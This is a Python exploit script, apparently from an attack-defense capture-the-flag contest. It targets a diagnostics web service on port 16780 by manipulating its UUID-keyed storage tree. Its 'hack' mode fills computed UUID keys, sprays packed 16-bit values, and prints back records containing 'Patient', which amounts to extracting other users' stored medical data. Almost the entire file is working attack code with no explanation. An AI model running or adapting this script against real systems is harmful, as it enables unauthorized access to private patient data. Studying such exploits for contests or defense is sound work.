#!/usr/bin/env python3

import requests
import traceback
import random
import string
import time
import sys
import struct
import subprocess
import queue

from bs4 import BeautifulSoup

hostname = sys.argv[1]

def put(key, value):
    url = "http://" + hostname + ":16780/" + key;
    response = requests.post(url, data = b"diag=" + value, allow_redirects = False)
    key = response.headers['Location'][1:]
    #print("Saved value " + str(value) + " @ " + key)

def get(key):
    url = "http://" + hostname + ":16780/" + key
    response = requests.get(url)
    soup = BeautifulSoup(response.text, features="html.parser")
    diag = soup.find(id="diag")
    return diag.text

def compute_path(n):
    path = []
    while (n > 2047):
        if n % 2 == 0:
            n = (n - 2) // 2
            path.append(('right', n))

        else:
            n = (n - 1) // 2
            path.append(('left', n))
    return path

def compute_uuids(start, path):
    lower = 0x2200
    upper = 0x4200
    mid = (lower + upper) // 2
    uuid = start[:2] + hex(mid)[2:] + start[6:]
    uuids = [uuid]
    for where, n in path[::-1][1:]:
        mid = (lower + upper) // 2
        if where == 'left':
            upper = mid
            mid = (lower + upper) // 2
        else:
            lower = mid
            mid = (lower + upper) // 2
        uuid = start[:2] + hex(mid)[2:] + start[6:]
        uuids.append(uuid)
    return uuids

def prefill(depth):
    keys = []
    q = queue.Queue()
    q.put((0, 0xffffffff, 10))
    while not q.empty():
        lower, upper, depth = q.get()
        mid = ((lower + upper) // 2) & 0xffffffff
        keys.append(hex(mid)[2:] + '-0000-0000-0000-000000000000')

        if depth > 0:
            q.put((lower, mid, depth - 1))
            q.put((mid, upper, depth - 1))
    return keys

cmd = sys.argv[2]

if cmd == 'put':
    put(sys.argv[3], sys.argv[4].encode('ascii'))

if cmd == 'gen':
    keys = prefill(10)
    print(keys[:10])

    for i in range(2047):
        path = compute_path(10_000_012 + 140 * i)
        start = keys[path[-1][1]]
        print(path)
        print(start)
        uuids = compute_uuids(start, path)
        for s in uuids:
            print(s)
        input()
        for uuid in uuids[:-1]:
            put(uuid, b"x")


# uuids = [
#     '31320000-0000-0000-0000-000000000000',
#     '312a0000-0000-0000-0000-000000000000',
#     '312e0000-0000-0000-0000-000000000000',
#     '31300000-0000-0000-0000-000000000000',
#     '312f0000-0000-0000-0000-000000000000',
#     '312f8000-0000-0000-0000-000000000000',
#     '312f4000-0000-0000-0000-000000000000',
#     '312f2000-0000-0000-0000-000000000000',
#     '312f1000-0000-0000-0000-000000000000',
#     '312f1800-0000-0000-0000-000000000000',
#     '312f1c00-0000-0000-0000-000000000000',
#     '312f1a00-0000-0000-0000-000000000000',
#     '312f1b00-0000-0000-0000-000000000000',
# ]

# uuids = [
#     '31300000-0000-0000-0000-000000000000',
#     '312f0000-0000-0000-0000-000000000000',
#     '312ff000-0000-0000-0000-000000000000',
#     '312fff00-0000-0000-0000-000000000000',
#     '312ffe00-0000-0000-0000-000000000000',
#     '312ffef0-0000-0000-0000-000000000000',
#     '312ffeef-0000-0000-0000-000000000000',
#     '312ffeee-f000-0000-0000-000000000000',
#     '312ffeee-ee00-0000-0000-000000000000',
#     '312ffeee-ef00-0000-0000-000000000000',
#     '312ffeee-efff-0000-0000-000000000000',
#     '312ffeee-effe-0000-0000-000000000000',
#     '312ffeee-effe-f000-0000-000000000000'
# ]

if cmd == 'hack':
    keys = prefill(10)
    print(keys[:10])

    for i in range(2047):
        path = compute_path(10_000_012 + 140 * i)
        start = keys[path[-1][1]]
        print(path)
        print(start)

        uuids = compute_uuids(start, path)
        for s in uuids:
            print(s)

        print('Press enter to hack with node ' + str(i))
        input()

        for uuid in uuids[:-1]:
            put(uuid, b"x")

        #for j in range(2048, 11500):
        for j in range(2048, 2500):
            val = struct.pack("H", j)
            if b'\x00' in val:
                continue
            put(keys[i], val);
            result = get(uuids[-1]);
            if "Patient" in result:
                print(result.split()[1])